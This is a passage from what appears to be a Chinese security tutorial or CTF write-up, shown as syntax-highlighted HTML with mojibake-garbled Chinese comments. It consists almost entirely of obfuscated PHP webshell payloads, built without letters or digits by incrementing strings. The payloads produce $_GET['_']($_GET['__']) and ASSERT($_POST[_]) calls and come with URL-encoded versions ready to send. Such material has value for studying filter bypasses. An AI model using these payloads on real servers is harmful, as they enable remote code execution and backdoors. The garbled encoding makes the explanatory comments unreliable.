GE  ä¸€ä¸ªçŸ­æ è‡ªå¢å˜æˆäº†Gï¼Œä¸¤ä¸ªçŸ­æ åœ¨å‰é¢ç¬¬åä¸€è¡Œå¤„å·²ç»èµ‹å€¼ä¸ºEï¼Œæ‹¼æ¥å¾—GE</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//H æ­¤å¤„ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢ï¼Œä¸ºH</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//I</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//J</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//k</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//L</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//M</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//N</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//O</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//P</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//Q</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//R</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//S</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//T</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// GET åœ¨æ­¤å¤„ï¼Œä¸¤æ¡çŸ­æ åŸæ˜¯GEä¸ä¸€æ¡çŸ­æ ï¼ˆå·²ç»è‡ªå¢ä¸ºTï¼‰ï¼Œ.=æ‹¼æ¥ï¼Œæ„æˆget</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è¿›è¡Œæ‹¼æ¥ï¼Œ$_GET['_']($_GET['__']);</span>urlç¼–ç åï¼š<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">.</span><span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b__<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// E </span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// O</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ASSERT($_POST[_]);</span>urlç¼–ç åï¼š<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">!</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token 